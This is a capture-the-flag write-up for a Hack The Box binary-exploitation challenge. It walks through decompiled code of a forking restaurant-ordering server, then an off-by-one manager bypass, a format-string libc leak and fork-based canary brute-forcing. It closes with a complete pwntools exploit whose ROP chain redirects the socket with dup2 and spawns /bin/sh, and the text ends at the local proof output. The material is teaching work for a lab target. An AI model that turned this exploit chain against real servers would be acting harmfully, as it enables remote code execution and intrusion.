---
type: ctf-writeup
title: Forks And Knives
summary: Turning a forking server's inherited state into an oracle for reliable binary exploitation.
published: true
platform: hack-the-box
category: pwn
challenge: Forks And Knives
difficulty: medium
status: finished
solved: true
binary: ./server
arch: x86_64
libc: ./libc.so.6
tags:
  - ctf
  - htb
  - pwn
  - writeup
link: https://app.hackthebox.com/challenges/Forks%2520and%2520Knives
aliases:
  - forksandknives
created_at: Saturday, July 4th 2026, 6:00:48 pm
modified_at: Monday, July 20th 2026, 9:44:30 pm
solved_on: 2026-07-04T17:16:00
---

# HTB Pwn - Forks And Knives

## Challenge Info

This [challenge](https://app.hackthebox.com/challenges/Forks%2520and%2520Knives) was authored by [j0j0m0d](https://app.hackthebox.com/users/155010).
> [!note] Challenge Scenario
> Here at the Forks & Knives restaurant we recently hired a new IT guy to add some features to our ordering and reservation system. Apparently, he isn't very good. We want to hire you to test our system. Can you find any problems?

## Binary Protections

| RELRO                            | Canary                         | NX         | PIE         |
| -------------------------------- | ------------------------------ | ---------- | ----------- |
| Full RELRO | Canary found | NX enabled | PIE enabled |

```zsh
$ checksec server
[*] '/opt/htb/challenge/forksandknives/pwn_forks_and_knives/challenge/server'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

## Program Architecture

So, we begin by loading the provided challenge binary into [Ghidra](#^ghidra). And just to preface, the symbols for this binary were stripped, so I went ahead and manually renamed and re-typed a multitude of function names and variables in the decompilation window.

### Server Setup and fork()

```c title=server:main() {47}
void main(void)

{
  int ret;
  int *error;
  astruct_1 *stack;
  socklen_t client_len;
  int opt_val;
  __pid_t child_pid;
  sockaddr *server_addr_pointer;
  sockaddr_in server_addr;
  sockaddr_in client_addr;
  long canary_snapshot;
  
  server_addr_pointer = (sockaddr *)&server_addr;
  signal(2,shutdown);
  signal(17,(__sighandler_t)1);
  server_fd = socket(2,1,0);
  if (server_fd < 0) {
    perror("socket");
    error = __errno_location();
    exit(*error);
  }
  opt_val = 1;
  setsockopt(server_fd,1,2,&opt_val,4);
  server_addr.sin_family = 2;
  server_addr.sin_addr.s_addr = 0;
  server_addr.sin_port = htons(1337);
  memset(server_addr.sin_zero,0,8);
  ret = bind(server_fd,server_addr_pointer,0x10);
  if (ret < 0) {
    perror("bind");
    error = __errno_location();
    exit(*error);
  }
  ret = listen(server_fd,0);
  if (ret < 0) {
    perror("listen");
    error = __errno_location();
    exit(*error);
  }
  printf("Server listening on port %d\n",1337);
  while( true ) {
    client_fd = 0xffffffff;
    client_fd = accept(server_fd,(sockaddr *)&client_addr,&client_len);
    printf("Client connected with fd: %d\n",client_fd);
    child_pid = fork(); // This is important!
    if (child_pid == 0) break;
    close(client_fd);
  }
  close(server_fd);
  menu();
  shutdown(client_fd,2);
  close(client_fd);
  printf("Client %d disconnected\n",client_fd);
  exit(0);
}
```

> [!tip] fork()
> The binary is a forking TCP server, meaning that every connection forks to a new process.

This main function is fairly boilerplate for a simple server. It first sets up a listener with some arguments `{c} server_addr.sin_addr.s_addr = 0;` the 0 here means `{c} INADDR_ANY` (usually `0.0.0.0`) and `{c} server_addr.sin_port = htons(1337);` sets the port to `1337`, so we know that the binary binds to any available address. Meaning we can connect on `localhost:1337`.

It then continues until it reaches the `{c} menu()` function, which, due to the fork, run upon a client connection.

This `{c} fork()` function is important to us. This is due to the fact that the parent process stays alive even if the child process crashes, in our case, we might need to bruteforce the stack canary.

> [!tip] fork() stack canary bruteforce
> Because the children are forked from the same long-running parent, they inherit the same stack-canary value. This turns the canary into a byte-by-byte oracle: reconnect, test one candidate byte, and determine whether the child survived.

We will get to showing how this works in practice in the exploitation section.

### Per Client Menu

```c title=server:menu() {15}
void menu(void)

{
  int read_input;
  ssize_t return;
  bool exit;
  
  is_user = 1;
  order_placed = 0;
  table_reserved = 0;
  write(client_fd,
        "Welcome to the Forks & Knives restaurant!\nMy name is Forky and I will be your handler tonight\nCan I have your name please?\n=> "
        ,0x7e);
  return = read(client_fd,name,0x10); // read() returns ssize_t
  name[(int)return] = '\0'; // off by one null byte bug!
  exit = false;
  while (!exit) {
    read_input = banner();
    switch(read_input) {
    default:
      write(client_fd,"Invalid option.\n",0x10);
      break;
    case 1:
      reserve_table();
      break;
    case 2:
      place_order();
      break;
    case 3:
      exit = true;
      break;
    case 4:
      login();
      break;
    case 5:
      show_reservations();
      break;
    case 6:
      clear_reservations();
    }
  }
  write(client_fd,"Goodbye! Hope you had a great night!\n",0x25);
  return;
}
```

This is the function the client reaches upon connection. It gives us a few options, here is the banner to help visualise:

```ansi title="Terminal - nc localhost 1337"
Welcome to the Forks & Knives restaurant!
My name is Forky and I will be your handler tonight
Can I have your name please?
=> jake
+--------------------+
| 1) Reserve a table |
| 2) Place an order  |
| 3) Exit            |
+--------------------+

+- Manager interface (in development) -+
| 4) Login as manager                  |
| 5) View reservations                 |
| 6) Clear reservations                |
+--------------------------------------+
=>
```

The manager interface functions give us another clue, when decompiling them in [ghidra](#^ghidra) we see that the login functionality is not yet implemented:

```c title=server:login()
void login(void)

{
  write(client_fd,"This feature is not available yet.\n",0x23);
  return;
}
```

And the other manager options require us to be "logged in" (`{c} is_user == 0`)

```c title=server:show_reservations()
void show_reservations(void)

{
  int file_error;
  FILE *file_ptr;
  size_t bytes_read;
  astruct_2 *stack;
  char output_buf [1032];
  long canary_snapshot;
  
  canary_snapshot = stack->canary;
  if (is_user == 0) {
    file_ptr = fopen("reservations.txt","r");
    if (file_ptr == (FILE *)0x0) {
      perror("fopen");
      write(client_fd,"Could not get the reservations.\n",0x20);
    }
    else {
      bytes_read = fread(output_buf,1,1024,file_ptr);
      file_error = ferror(file_ptr);
      if (file_error == 0) {
        write(client_fd,output_buf,bytes_read);
      }
      else {
        clearerr(file_ptr);
        perror("fread");
        write(client_fd,"Could not get the reservations.\n",0x20);
      }
    }
  }
  else {
    write(client_fd,"Only managers may view the reservations.\n",0x29);
  }
  if (canary_snapshot != stack->canary) {
    __stack_chk_fail();
  }
  return;
}
```

```c title=server:clear_reservations()
void clear_reservations(void)

{
  FILE *file_ptr;
  
  if (is_user == 0) {
    file_ptr = fopen("reservations.txt","w");
    fclose(file_ptr);
    write(client_fd,"Cleared reservations.\n",0x16);
  }
  else {
    write(client_fd,"Only managers may clear the reservations.\n",0x2a);
  }
  return;
}
```

So in order for us to be able to read the reservations.txt file, we need to find a way to set `{c} is_user = 0`, thankfully there is a nice little bug in the `{c} menu()` function that gives us exactly that.

## Vulnerability Analysis

### 1. Off-by-one NUL Write

> [!bug] Vulnerability
> Off-by-one NUL write from the 16-byte name buffer overwrites the adjacent global (writing it to 0), allowing an attacker who supplies exactly 16 bytes to overwrite the low byte of the next global.

Below is the relevant snipped of the .bss section of the binary.
^server-bss

```asm title=server:.bss
name
        00104030                 char[16]   ??
           00104030                 char      ??                      [0]
           00104031                 char      ??                      [1]
           00104032                 char      ??                      [2]
           00104033                 char      ??                      [3]
           00104034                 char      ??                      [4]
           00104035                 char      ??                      [5]
           00104036                 char      ??                      [6]
           00104037                 char      ??                      [7]
           00104038                 char      ??                      [8]
           00104039                 char      ??                      [9]
           0010403a                 char      ??                      [10]
           0010403b                 char      ??                      [11]
           0010403c                 char      ??                      [12]
           0010403d                 char      ??                      [13]
           0010403e                 char      ??                      [14]
           0010403f                 char      ??                      [15]
is_user
        00104040                 int        ??
```


As you can see, because arrays start at 0, writing to an array with a size of 16 at `{c} name[16]` would actually write into the `is_user` global. If you were particularly eagle-eyed, the `{c} menu()` function sets `{c} is_user = 1;`.

Now let's talk about both lines together, and why `return` is important here:

```c
return = read(client_fd,name,0x10);
name[(int)return] = '\0';
```

> [!tip] read()
> The function `{c} read()` takes 3 arguments:
`{c} ssize_t read(int __fd,void *__buf,size_t __nbytes)`
> 1. Reads from our `client_fd` which is where our input gets sent to.
> 2. Reads that input into the pointer to `name`.
> 3. Reads up to the number of bytes supplied `{c} 0x10` (16 bytes)

Now this read is fine, there is no overflow here, because `{c} read()` understands that arrays start at 0, and the `name` global is 16 bytes long, meaning it spans from \[0-15\].

However, you can notice that read returns `{c} ssize_t` which is the size/number of bytes that were read by the function. If we send read 16 bytes of data, it will return 16. And this is where the bug exists.

So, supplying 16 bytes to that read function causes the next line `{c} name[(int)return] = '\0';` to append a null byte to the `is_user` global, setting it to 0.

Let's give an example in pwntools:

```python
# because the client immediately asks for our name upon connection, we can just connect
# using pwntools and sendafter(b"=> ").

# before:
# is_user = 0x00000001

p.sendafter(b"=> ", b"A" * 16) # we use sendafter() to avoid sending an extra newline

# after name[16] = '\0':
# is_user = 0x00000000
```

Here is the evidence in gdb:

```zsh {13}
# before
gef➤  x/32gx 0x0000555555558010
0x555555558010:	0x0000000000000000	0x0000000000000000
0x555555558020:	0x0000000400000003	0x0000000000000000
0x555555558030:	0x0000000000000000	0x0000000000000000 # name = 0
0x555555558040:	0x0000000000000001	0x0000000000000000 # is_user = 1

# after
gef➤  x/32gx 0x0000555555558010
0x555555558010:	0x0000000000000000	0x0000000000000000
0x555555558020:	0x0000000400000003	0x0000000000000000
0x555555558030:	0x4141414141414141	0x4141414141414141 # name = b"A" * 16
0x555555558040:	0x0000000000000000	0x0000000000000000 # is_user = 0
```

We read from these addresses because we know where the .bss section is stored in memory thanks to [the ghidra .bss section above](#^server-bss)

This now allows us to use the manager options from the menu, straight from the get-go!

### 2. Reservation Format String

```c title=server:reserve_table() collapse={11-47} collapseStyle=collapsible-auto {55, 56}
void reserve_table(void)

{
  int write_reservations_ret;
  ssize_t bytes_received;
  astruct_3 *stack;
  ReservationBuffer amount;
  long canary_snapshot;
  
  canary_snapshot = stack->canary;
  amount.formatted_msg[0] = '\0';
  amount.formatted_msg[1] = '\0';
  amount.formatted_msg[2] = '\0';
  amount.formatted_msg[3] = '\0';
  amount.formatted_msg[4] = '\0';
  amount.formatted_msg[5] = '\0';
  amount.formatted_msg[6] = '\0';
  amount.formatted_msg[7] = '\0';
  amount.formatted_msg[8] = '\0';
  amount.formatted_msg[9] = '\0';
  amount.formatted_msg[10] = '\0';
  amount.formatted_msg[0xb] = '\0';
  amount.formatted_msg[0xc] = '\0';
  amount.formatted_msg[0xd] = '\0';
  amount.formatted_msg[0xe] = '\0';
  amount.formatted_msg[0xf] = '\0';
  amount.formatted_msg[0x10] = '\0';
  amount.formatted_msg[0x11] = '\0';
  amount.formatted_msg[0x12] = '\0';
  amount.formatted_msg[0x13] = '\0';
  amount.formatted_msg[0x14] = '\0';
  amount.formatted_msg[0x15] = '\0';
  amount.formatted_msg[0x16] = '\0';
  amount.formatted_msg[0x17] = '\0';
  amount.formatted_msg[0x18] = '\0';
  amount.formatted_msg[0x19] = '\0';
  amount.formatted_msg[0x1a] = '\0';
  amount.formatted_msg[0x1b] = '\0';
  amount.formatted_msg[0x1c] = '\0';
  amount.formatted_msg[0x1d] = '\0';
  amount.formatted_msg[0x1e] = '\0';
  amount.formatted_msg[0x1f] = '\0';
  amount.input_chars[0] = '\0';
  amount.input_chars[1] = '\0';
  amount.input_chars[2] = '\0';
  amount.input_chars[3] = '\0';
  amount.input_chars[4] = '\0';
  if (table_reserved == 1) {
    write(client_fd,"You have already reserved a table.\n",0x23);
  }
  else {
    write(client_fd,"How many people would you like to reserve the table for?\n=> ",0x3c);
    bytes_received = read(client_fd,&amount,4);
    amount.input_chars[(int)bytes_received] = '\0';
    snprintf(amount.formatted_msg,0x20,"Table for %s\n",amount.input_chars);
    write_reservations_ret = write_reservations(amount.formatted_msg);
    if (write_reservations_ret < 0) {
      write(client_fd,"Unable to reserve your table.\n",0x1e);
    }
    table_reserved = 1;
    write(client_fd,"Your table has been reserved.\n",0x1e);
  }
  if (canary_snapshot != stack->canary) {
    __stack_chk_fail();
  }
  return;
}
```

```c title=server:write_reservations() {13}
int write_reservations(char *param_1)

{
  int ret;
  FILE *file_ptr;
  
  file_ptr = fopen("reservations.txt","a");
  if (file_ptr == (FILE *)0x0) {
    perror("fopen");
    ret = -1;
  }
  else {
    fprintf(file_ptr,param_1); // The amount.formatted_msg is passed as param_1 here
    fclose(file_ptr);
    ret = 0;
  }
  return ret;
}
```

> [!bug] Vulnerability
> reserve_table() builds a user-controlled string and then passes it directly to the reservation writer as a format string; an attacker can supply short format specifiers (e.g. `{c} %2$p`) to leak pointers (libc/stack) and aid exploitation.

The `{c} reserve_table()` function was a mess to decompile in [ghidra](#^ghidra), I have collapsed a bunch of lines because honestly they are just ugly.

Besides that, we have a fairly constrained format string vulnerability here.

`{c} read(client_fd, &amount, 4)` reads up to 4 bytes of attacker input into amount.input_chars

Constraints: only up to 4 bytes of direct control, so payloads must be short (e.g. `{c} %p%p`, `{c} %2$p` (4 bytes) is enough to leak a pointer.

In order to find a useful leak, to be honest with you, I just manually went through `{c} %1$p` to `{c} %9$p` and then ran `{bash} cat reservations.txt`. I could've written a pwntools script to do this for me but with such a limited amount of options I decided to do it manually.

Eventually I found that `{c} %2$p` prints a libc address, which is a lovely leak to have.

> [!NOTE] Supplied libc.so.6
> If we hadn't been supplied the remote servers version of libc, we would've had a much harder time calculating the offset for this leak. It does not mean it's impossible, but it's a problem I would enjoy solving in the future and will most probably write more about it.

Naturally we want to calculate the base of libc using this leak, so let's go ahead and do so in gdb:

```ansi title="Terminal (nc localhost 1337)" {28, 14}
+--------------------+
| 1) Reserve a table |
| 2) Place an order  |
| 3) Exit            |
+--------------------+

+- Manager interface (in development) -+
| 4) Login as manager                  |
| 5) View reservations                 |
| 6) Clear reservations                |
+--------------------------------------+
=> 1
How many people would you like to reserve the table for?
=> %2$p
Your table has been reserved.
+--------------------+
| 1) Reserve a table |
| 2) Place an order  |
| 3) Exit            |
+--------------------+

+- Manager interface (in development) -+
| 4) Login as manager                  |
| 5) View reservations                 |
| 6) Clear reservations                |
+--------------------------------------+
=> 5
Table for 0x7ffff7d1491b
```

```zsh wrap=false frame=terminal {10}
gef➤  vmmap
[ Legend:  Code | Stack | Heap ]
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /opt/htb/challenge/forksandknives/pwn_forks_and_knives/challenge/server_patched
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /opt/htb/challenge/forksandknives/pwn_forks_and_knives/challenge/server_patched
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /opt/htb/challenge/forksandknives/pwn_forks_and_knives/challenge/server_patched
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /opt/htb/challenge/forksandknives/pwn_forks_and_knives/challenge/server_patched
0x0000555555558000 0x000055555555b000 0x0000000000003000 rw- /opt/htb/challenge/forksandknives/pwn_forks_and_knives/challenge/server_patched
0x000055555555b000 0x000055555557c000 0x0000000000000000 rw- [heap]
0x00007ffff7c00000 0x00007ffff7c28000 0x0000000000000000 r-- /opt/htb/challenge/forksandknives/pwn_forks_and_knives/challenge/libc.so.6
0x00007ffff7c28000 0x00007ffff7dbd000 0x0000000000028000 r-x /opt/htb/challenge/forksandknives/pwn_forks_and_knives/challenge/libc.so.6
0x00007ffff7dbd000 0x00007ffff7e15000 0x00000000001bd000 r-- /opt/htb/challenge/forksandknives/pwn_forks_and_knives/challenge/libc.so.6
0x00007ffff7e15000 0x00007ffff7e16000 0x0000000000215000 --- /opt/htb/challenge/forksandknives/pwn_forks_and_knives/challenge/libc.so.6
0x00007ffff7e16000 0x00007ffff7e1a000 0x0000000000215000 r-- /opt/htb/challenge/forksandknives/pwn_forks_and_knives/challenge/libc.so.6
0x00007ffff7e1a000 0x00007ffff7e1c000 0x0000000000219000 rw- /opt/htb/challenge/forksandknives/pwn_forks_and_knives/challenge/libc.so.6
0x00007ffff7e1c000 0x00007ffff7e29000 0x0000000000000000 rw-
0x00007ffff7fb6000 0x00007ffff7fbb000 0x0000000000000000 rw-
0x00007ffff7fbb000 0x00007ffff7fbf000 0x0000000000000000 r-- [vvar]
0x00007ffff7fbf000 0x00007ffff7fc1000 0x0000000000000000 r-- [vvar_vclock]
0x00007ffff7fc1000 0x00007ffff7fc3000 0x0000000000000000 r-x [vdso]
0x00007ffff7fc3000 0x00007ffff7fc5000 0x0000000000000000 r-- /opt/htb/challenge/forksandknives/pwn_forks_and_knives/challenge/ld-2.35.so
0x00007ffff7fc5000 0x00007ffff7fef000 0x0000000000002000 r-x /opt/htb/challenge/forksandknives/pwn_forks_and_knives/challenge/ld-2.35.so
0x00007ffff7fef000 0x00007ffff7ffa000 0x000000000002c000 r-- /opt/htb/challenge/forksandknives/pwn_forks_and_knives/challenge/ld-2.35.so
0x00007ffff7ffb000 0x00007ffff7ffd000 0x0000000000037000 r-- /opt/htb/challenge/forksandknives/pwn_forks_and_knives/challenge/ld-2.35.so
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000039000 rw- /opt/htb/challenge/forksandknives/pwn_forks_and_knives/challenge/ld-2.35.so
0x00007ffffffdd000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
```

Using `vmmap` we can see that the memory region for libc starts at `{gd} 0x00007ffff7c00000`, that is the libc base.

So let's calculate the offset of our leak to the base using gdb:

```zsh frame=terminal
gef➤  print 0x7ffff7d1491b - 0x00007ffff7c00000
$1 = 0x11491b
```

Our offset for our leak is `{gd} 0x11491b` so our calculation for finding the libc base is: `{python} libc_base = libc_leak - 0x11491b`

This offset is specific to the challenge's supplied `libc.so.6`.

### 3. Stack Buffer Overflow

```c title=server:place_order() {28}
void place_order(void)

{
  int is_yes;
  ssize_t bytes_read;
  astruct *stack;
  char yes_no [2];
  int order_buf_size;
  char order [264];
  long canary_snapshot;
  
  canary_snapshot = stack->canary;
  if (table_reserved == 0) {
    write(client_fd,"Please reserve a table before ordering.\n",0x28);
  }
  else if (order_placed == 1) {
    write(client_fd,"You have already placed an order.\n",0x22);
  }
  else {
    write(client_fd,"What would you like to order?\n=> ",0x21);
    bytes_read = read(client_fd,order,256);
    write(client_fd,"Would you like to add anything to your order? (y/n)\n=> ",0x37);
    read(client_fd,yes_no,2);
    yes_no[1] = '\0';
    is_yes = strcmp(yes_no,"y");
    if (is_yes == 0) {
      write(client_fd,"What else will you add to your order?\n=> ",0x29);
      read(client_fd,order + (int)bytes_read,256); // Buffer Overflow!
    }
    order_placed = 1;
    write(client_fd,"You order has been placed!\n",0x1b);
  }
  if (canary_snapshot != stack->canary) {
    __stack_chk_fail();
  }
  return;
}
```

> [!bug] Vulnerability
> Stack based buffer overflow due to `{c} read(client_fd,order + (int)bytes_read,256);`. Allowing us to write outside of the `{c} order[264]` buffer.

This stack overflow may be a little difficult to notice at first glance, but upon inspection we can see that:

```c
write(client_fd,"What would you like to order?\n=> ",0x21);
bytes_read = read(client_fd,order,256);
```

Allows us to write up to 256 bytes into the `{c} order [264]` buffer, this alone is safe because 264 - 256 = 8, giving us 8 bytes of extra unused space in the buffer.

However, the program then asks if we would like to add anything else to our order:

```c
write(client_fd,"Would you like to add anything to your order? (y/n)\n=> ",0x37);
read(client_fd,yes_no,2);
yes_no[1] = '\0';
is_yes = strcmp(yes_no,"y");
if (is_yes == 0) {
	write(client_fd,"What else will you add to your order?\n=> ",0x29);
	read(client_fd,order + (int)bytes_read,256); // Adding the bytes_read from the previous read()
}
```

This part of the code is an attempt at appending to our order, but the vulnerability lies within the fact that `{c} bytes_read` is the returned size of our input from our first order `{c} read()`.

The second order `{c} read()` allows another 256-byte read without checking how much space remains in the order buffer, thanks to `{c} order + (int)bytes_read`

If we provide 256 bytes to our first order read like so:

```python
p.sendafter(b"=> ", b"A" * 256)
```

This turns our stack into something like this:

```ansi frame=code
Higher addresses
+-------------------------+
| saved RIP               |
+-------------------------+
| saved RBP               | 8 bytes
+-------------------------+
| stack canary            | 8 bytes
+-------------------------+
| order[256:264]          | 8 empty bytes 
+-------------------------+
| order[0:256]            | filled by first read
+-------------------------+
Lower addresses
```

But if we answer yes to adding more to our order like so:

```python
p.sendafter(b"=> ", b"y\x00")
p.sendafter(b"=> ", b"B" * 8)
```

We can achieve something like this:

```ansi frame=code
Higher addresses
+-------------------------+
| saved RIP               |
+-------------------------+
| saved RBP               | 8 bytes
+-------------------------+
| stack canary            | 8 bytes
+-------------------------+
| order[256:264]          | 8 bytes filled by second read
+-------------------------+
| order[0:256]            | filled by first read
+-------------------------+
Lower addresses
```

Now we run into a new problem, because we could easily overflow straight past the buffer and into the stack canary -> saved RBP -> saved RIP. Doing so would cause the child process to crash due to the stack canary being overwritten.

But Thanks to the forking nature of the binary, we can bruteforce the canary!

### 4. Why the Canary Is Brute-Forceable

Before bruteforcing the stack canary, it helps to first understand how it is laid out in memory.

On 64-bit Linux, a stack canary is typically an 8-byte value placed between local stack variables and important control-flow data such as the saved base pointer (RBP) and return address (RIP).

In this challenge, the canary is 8 bytes long and its first byte in memory is a NUL byte:

`00 ?? ?? ?? ?? ?? ?? ??`

Because the target is little-endian, this is the least-significant byte. When displayed as a 64-bit integer, a canary may therefore look like:

`{c} 0xba0448410ccac700`

Notice that the value ends in `00`.

The NUL byte is intended to make common string-based overflows more difficult. Functions that treat input as a C string normally stop when they encounter `\x00`, making it harder to copy a complete canary using functions such as `{c} strcpy()`.

For our bruteforce, this means we only need to guess the remaining 7 bytes. This can be done by repeatedly guessing one byte at a time, and checking if the child process returns to the menu (or crashes).

And since the server uses `{c} fork()` the parent process's stack canary is copied into the child process, which is what facilitates this entire bruteforce technique.

## Exploit Development

The exploit is split into four stages:

1. Abuse the off-by-one NUL write to set `is_user` to 0.
2. Use the manager interface and format-string vulnerability to leak a libc address.
3. Bruteforce the stack canary by repeatedly connecting to the fork server.
4. Trigger the stack overflow and execute a libc ROP chain.

To start with let's create some helper functions:
^automatic-manager-bypass

```python
elf = ELF("./server_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

def get_target():
	if args.REMOTE:
		p = remote("154.57.164.63", 31455) # this was my hack the box challenge instance
	else:
		p = remote("127.0.0.1", 1337)
	
	# here we automatically exploit the manager bypass vulnerability on every connection
	p.sendafter(b"=> ", b"A" * 16)
	return p

# menu wrappers
def choice(p, idx): p.sendlineafter(b"=> ", str(idx).encode())
def clear_reservations(p): choice(p, 6)
def show_reservations(p): choice(p, 5); return p.recvuntil(b"+--------------------+", drop=True)

def reserve_table(p, amount=b"1234"):
	assert len(amount) <= 4
	choice(p, 1)
	
	# reserve_table() reads exactly up to 4 bytes.
	# Send exactly 4 so there is no newline left in the socket buffer.
	p.sendafter(b"=> ", amount.ljust(4, b"\x00"))
```


Here we load both the challenge binary and libc into pwntools ELF loader, you will notice that the binary used is named `server_patched`, this is because I used [pwninit](#^pwninit) to force the binary to use the supplied `libc.so.6`.

We also have some basic functions that help us shorten our other functions, such as the menu wrappers that just allow for an easier way of reaching specific menu areas and sending our supplied data.

### Stage 1: Manager Authentication Bypass

We force every connection to exploit the name off by one NUL byte vulnerability, just for ease of use. This takes place in the [helper functions](#^automatic-manager-bypass).

### Stage 2: Leaking Libc

```python
def leak_libc(fmt):
    assert len(fmt) <= 4

    with context.local(log_level="error"):
        p = get_target()
        clear_reservations(p)

        # The reservation file is our printf output sink:
        # user amount -> "Table for %2$p\n" -> fprintf(stream, fmt) -> reservations.txt
        # manager bypass -> show_reservations() -> leak over socket
        reserve_table(p, fmt)

        data = show_reservations(p)
        p.close()

        if isinstance(data, str):
            data = data.encode()

        leak = int(re.search(rb"0x[0-9a-fA-F]+", data).group(0), 16)
        return leak
```

> [!tip] Regex
> We use a regex here to extract just the leaked address from `Table for 0x7ffff7d1491b`. This can be reused and modified for future challenges where applicable!

This allows us to construct:

```python
libc_leak = leak_libc(b"%2$p")
log.success(f"libc leak -> {hex(libc_leak)}")

libc_base = libc_leak - 0x11491b
log.success(f'libc base -> {hex(libc_base)}')
```

The usage of `{python} with context.local(log_level="error"):` allows us to remove the log spam from pwntools opening new connections.

### Stage 3: Brute-Forcing the Canary

```python
def brute_canary():
    # canary low byte is known NUL; fork-server children reuse the same parent TLS canary.
    canary = b"\x00"

    with log.progress("bruteforcing canary") as prog:
        # wrong guesses kill only the child, so reconnect and brute force bytes 1..7.
        for idx in range(1, 8):
            for guess in range(256):
                attempt = canary + bytes([guess])
                shown = u64(attempt.ljust(8, b"\x00"))

                prog.status(f"byte {idx}/7 trying {guess:#04x} | {hex(shown)}")

                if try_canary_prefix(attempt):
                    canary = attempt
                    break
            else:
                log.failure(f"failed at byte {idx}, partial={canary.hex()}")
                raise SystemExit

        canary = u64(canary)
        prog.success(f"canary -> {hex(canary)}")

    return canary
```

This is the function we use to build the final canary, it may look quite complex but it's actually fairly simple. We just keep guessing every possible byte value and appending the ones that don't crash the child process.

I also made use of pwntools `{py} log.progress()` so that instead of spamming the terminal with guess information, it just updates a single terminal line with the current status.

```python
def try_canary_prefix(prefix):
    timeout = 1.0 if args.REMOTE else 0.05
    with context.local(log_level="error"):
        p = None
        try:
            p = get_target()

            reserve_table(p, b"1234")
            choice(p, 2)

            p.sendafter(b"=> ", b"A" * 256)
            p.sendafter(b"=> ", b"y\x00")

            payload = b"B" * 8 + prefix
            p.sendafter(b"=> ", payload)

            data = p.recvuntil(b"=> ", timeout=timeout)

            return bool(data and b"+--------------------+" in data)

        except EOFError:
            return False

        finally:
            if p is not None:
                try:
                    p.close()
                except Exception:
                    pass
```

We set the `timeout` based on whether the connection is remote or local, as the remote htb server is much slower, our bruteforce needs more time to determine if the process has crashed.

This is where the bruteforce really happens, we overflow the buffer just enough to reach the stack canary (`{python} b"B" * 8 + prefix`), and append our current guess to the payload. We do not actually overwrite the entire canary here, just the lower bytes that we have yet to guess, leaving the rest of the canary intact.

We know if a guess was correct because the server will continue its normal execution and display:

```ansi
+--------------------+
| 1) Reserve a table |
| 2) Place an order  |
| 3) Exit            |
+--------------------+

+- Manager interface (in development) -+
| 4) Login as manager                  |
| 5) View reservations                 |
| 6) Clear reservations                |
+--------------------------------------+
=>
```

So we just use `{python} data = p.recvuntil(b"=> ", timeout=timeout)` and `{python} return bool(data and b"+--------------------+" in data)` to check if we have managed to guess correctly.

If the child crashes, the connection may close and cause an `EOFError`. If it does not close cleanly before our timeout, `recvuntil()` will fail to return the menu banner. In either case, the function returns `False`.

We continue this loop until we have correctly guessed all 7 remaining bytes of the stack canary.

The worst-case scenario in terms of bruteforcing the canary amounts to: 7 * 256 = 1792 connections, however the average should be roughly half that number of guesses, assuming uniformly distributed bytes.

### Stage 4: Constructing the Final Overflow

```python
def exploit(canary, libc_base):
    p = get_target()

    reserve_table(p, b"EXPL")

    choice(p, 2)

    libc.address = libc_base
    rop = ROP(libc)

    sockfd = 4  # our socket fd

    # system("/bin/sh") needs dup2 first so the shell talks over the accepted socket fd.
    rop.call(libc.sym["dup2"], [sockfd, 0])
    rop.call(libc.sym["dup2"], [sockfd, 1])
    rop.call(libc.sym["dup2"], [sockfd, 2])

    rop.call(libc.sym["system"], [next(libc.search(b"/bin/sh"))])

    # log.info(rop.dump())

    # second read starts at order+0x100:
    #   +0x00: finish final 8 bytes of order[]
    #   +0x08: canary
    #   +0x10: saved rbp
    #   +0x18: saved rip / rop chain
    payload = flat(
        b"B" * 8,
        p64(canary),
        b"C" * 8,
        rop.chain(),
    )

    # first read fills order[0:256], second read consumes y/n,
    # third read begins at order + 256, i.e. 8 bytes before canary
    p.sendafter(b"=> ", b"A" * 256 + b"y\x00" + payload)
    p.recvuntil(b'You order has been placed!\n')
    p.interactive()
```

Because the binary is a network server, simply calling `{c} system("/bin/sh")` would not be enough to give us a usable shell. The shell's input and output would not automatically be sent through our connection, so although the shell may spawn, we would not be able to properly interact with it.

Thankfully, the server prints the file descriptor used for each client connection:

```text
Client connected with fd: 4
```

This remained the same every time I connected locally, so for this challenge we can use `4` as our client socket file descriptor.

The file descriptors we care about are:

```text
0 = stdin
1 = stdout
2 = stderr
4 = our client socket
```

This is where [dup2()](#^dup2) comes in:

```c
int dup2(int oldfd, int newfd);
```

For our purposes, `{c} dup2()` lets us copy our socket file descriptor over one of the standard file descriptors. For example:

```c
dup2(4, 0);
```

makes file descriptor `0`, or standard input, point to our socket. This means that anything the shell tries to read from stdin will instead be read from our connection.

We do the same thing for stdout and stderr:

```c
dup2(4, 0); // socket -> stdin
dup2(4, 1); // socket -> stdout
dup2(4, 2); // socket -> stderr
```

So after these calls, the shell will receive input from our connection and send both its normal output and error output back to us.

```text
0 ─┐
1 ─┼──> client socket
2 ─┘
4 ────> client socket
```

Once the file descriptors have been redirected, we can call:

```c
system("/bin/sh");
```

The shell inherits the redirected stdin, stdout and stderr file descriptors, giving us an interactive shell over the socket.

In our ROP chain, this looks like:

```python
sockfd = 4

rop.call(libc.sym["dup2"], [sockfd, 0])
rop.call(libc.sym["dup2"], [sockfd, 1])
rop.call(libc.sym["dup2"], [sockfd, 2])

rop.call(libc.sym["system"], [next(libc.search(b"/bin/sh"))])
```

```ansi frame=none
Second read begins here
        │
        v
+--------------------------+
| final 8 bytes of order   |  b"B" * 8
+--------------------------+
| stack canary             |  recovered canary
+--------------------------+
| saved RBP                |  padding
+--------------------------+
| saved RIP                |  first ROP gadget
+--------------------------+
| remaining ROP chain      |
+--------------------------+
```

```python
def main():
    libc_leak = leak_libc(b"%2$p")
    log.success(f"libc leak -> {hex(libc_leak)}")

    libc_base = libc_leak - 0x11491b
    log.success(f'libc base -> {hex(libc_base)}')

    canary = brute_canary()

    exploit(canary, libc_base)
```

And we tie it all together here, with our final `{python} p.interactive()` happening inside `{python} exploit()`

## Proof (Local)

```bash
$ python ex.py
[+] libc leak -> 0x7f98d331491b
[+] libc base -> 0x7f98d3200000
[+] bruteforcing canary: canary -> 0xba0448410ccac700
[+] Opening connection to 127.0.0.1 on port 1337: Done
